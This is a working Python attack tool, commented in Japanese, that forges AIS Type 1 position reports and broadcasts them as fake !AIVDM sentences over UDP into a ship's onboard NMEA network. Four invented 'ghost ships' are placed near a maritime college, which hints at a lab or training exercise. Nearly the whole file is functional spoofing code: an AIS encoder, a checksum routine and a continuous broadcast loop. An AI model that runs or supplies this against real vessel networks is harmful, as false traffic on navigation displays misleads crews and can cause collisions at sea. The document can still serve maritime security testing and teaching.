#!/usr/bin/env python3
"""
ais_spoof.py — AIS スプーフィングツール
========================================
log-server から実行し、船内 NMEA ネットワークに
偽の !AIVDM センテンスを送りつける攻撃スクリプト。

使い方:
    python3 ais_spoof.py                   # デフォルト: 幽霊船 4 隻を継続送信
    python3 ais_spoof.py --once            # 1 回だけ送信して終了
    python3 ais_spoof.py --target 192.168.20.255
    python3 ais_spoof.py --interval 0.5   # 送信間隔（秒）
"""

import socket
import time
import math
import argparse
from datetime import datetime, timezone


# ────────────────────────────────────────────
# AIS エンコーダー（外部ライブラリ不要）
# ────────────────────────────────────────────

def _nmea_checksum(sentence: str) -> str:
    """! と * の間の文字列を XOR → 2桁16進数を返す"""
    cs = 0
    for ch in sentence:
        cs ^= ord(ch)
    return f"{cs:02X}"


def _int_to_bits(value: int, width: int, signed: bool = False) -> str:
    """整数を指定ビット幅の2進文字列に変換（符号付きは2の補数）"""
    if signed and value < 0:
        value += (1 << width)
    return format(value & ((1 << width) - 1), f"0{width}b")


def _armored(bits: str) -> tuple[str, int]:
    """ビット列を AIS アーマード ASCII に変換。(payload, fill_bits) を返す"""
    fill = (6 - len(bits) % 6) % 6
    bits += "0" * fill
    payload = ""
    for i in range(0, len(bits), 6):
        v = int(bits[i:i+6], 2) + 48
        if v > 87:
            v += 8
        payload += chr(v)
    return payload, fill


def make_type1(mmsi: int, lat: float, lon: float,
               speed: float, course: float) -> str:
    """
    AIS Message Type 1（Position Report Class A）の !AIVDM センテンスを生成。

    Parameters
    ----------
    mmsi   : 9桁のMMSI番号（偽造値）
    lat    : 緯度（度）
    lon    : 経度（度）
    speed  : 対地速力（ノット）
    course : 対地針路（度）
    """
    b = ""
    b += _int_to_bits(1, 6)                        # Message Type = 1
    b += _int_to_bits(0, 2)                        # Repeat Indicator
    b += _int_to_bits(mmsi, 30)                    # MMSI
    b += _int_to_bits(0, 4)                        # Nav Status: underway
    b += _int_to_bits(-128, 8, signed=True)        # ROT: N/A
    b += _int_to_bits(int(speed * 10), 10)         # SOG × 10
    b += _int_to_bits(0, 1)                        # Position Accuracy: low
    b += _int_to_bits(round(lon * 600000), 28, signed=True)  # 経度 1/10000分
    b += _int_to_bits(round(lat * 600000), 27, signed=True)  # 緯度 1/10000分
    b += _int_to_bits(int(course * 10) % 3600, 12) # COG × 10
    b += _int_to_bits(511, 9)                      # True Heading: N/A
    b += _int_to_bits(60, 6)                       # Timestamp: N/A
    b += _int_to_bits(0, 2)                        # Maneuver
    b += _int_to_bits(0, 3)                        # Spare
    b += _int_to_bits(0, 1)                        # RAIM
    b += _int_to_bits(0, 19)                       # Radio status

    payload, fill = _armored(b)
    body = f"AIVDM,1,1,,A,{payload},{fill}"
    return f"!{body}*{_nmea_checksum(body)}\r\n"


# ────────────────────────────────────────────
# 幽霊船テーブル
# ────────────────────────────────────────────

GHOST_SHIPS = [
    # 広島商船高専付近の海域に出現させる
    dict(name="GHOST MARU 1",  mmsi=123456001, lat=34.2300, lon=132.8700, speed=8.0,  course=045.0, r=0.005, w=0.020),
    dict(name="GHOST MARU 2",  mmsi=123456002, lat=34.2150, lon=132.8800, speed=14.0, course=180.0, r=0.008, w=-0.015),
    dict(name="GHOST MARU 3",  mmsi=123456003, lat=34.2200, lon=132.8550, speed=6.5,  course=270.0, r=0.003, w=0.030),
    dict(name="SPOOFED TANKER",mmsi=987654321, lat=34.2280, lon=132.8620, speed=0.5,  course=000.0, r=0.001, w=0.005),
]


def _ghost_pos(ship: dict, t: int) -> tuple[float, float, float, float]:
    lat    = ship["lat"]    + ship["r"] * math.sin(t * ship["w"])
    lon    = ship["lon"]    + ship["r"] * math.cos(t * ship["w"])
    speed  = ship["speed"]  + 0.5 * math.sin(t * 0.07)
    course = (ship["course"] + 3.0 * math.cos(t * 0.05)) % 360
    return lat, lon, speed, course


# ────────────────────────────────────────────
# メイン
# ────────────────────────────────────────────

def run(target_ip: str, target_port: int, interval: float, once: bool):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    print("=" * 52)
    print("  AIS スプーフィング攻撃ツール")
    print("=" * 52)
    print(f"  送信先  : {target_ip}:{target_port}")
    print(f"  幽霊船  : {len(GHOST_SHIPS)} 隻")
    print(f"  間隔    : {interval}s  |  {'1回のみ' if once else '継続'}")
    print("=" * 52)
    print()

    t = 0
    try:
        while True:
            ts = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")
            for ship in GHOST_SHIPS:
                g_lat, g_lon, g_spd, g_crs = _ghost_pos(ship, t)
                pkt = make_type1(ship["mmsi"], g_lat, g_lon, g_spd, g_crs)
                sock.sendto(pkt.encode("ascii"), (target_ip, target_port))
                print(f"[{ts}] {ship['name']:20s}  MMSI={ship['mmsi']}"
                      f"  {g_lat:.5f}N {g_lon:.5f}E"
                      f"  {g_spd:.1f}kt {g_crs:.0f}deg  → SENT")

            if once:
                break

            print()
            t += 1
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[*] 停止しました")
    finally:
        sock.close()


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="AIS スプーフィングツール")
    ap.add_argument("--target",   default="192.168.20.255", help="送信先 IP（default: broadcast）")
    ap.add_argument("--port",     type=int, default=10110,  help="送信先ポート（default: 10110）")
    ap.add_argument("--interval", type=float, default=5.0,  help="送信間隔（秒, default: 5.0）")
    ap.add_argument("--once",     action="store_true",      help="1回だけ送信して終了")
    args = ap.parse_args()

    run(args.target, args.port, args.interval, args.once)
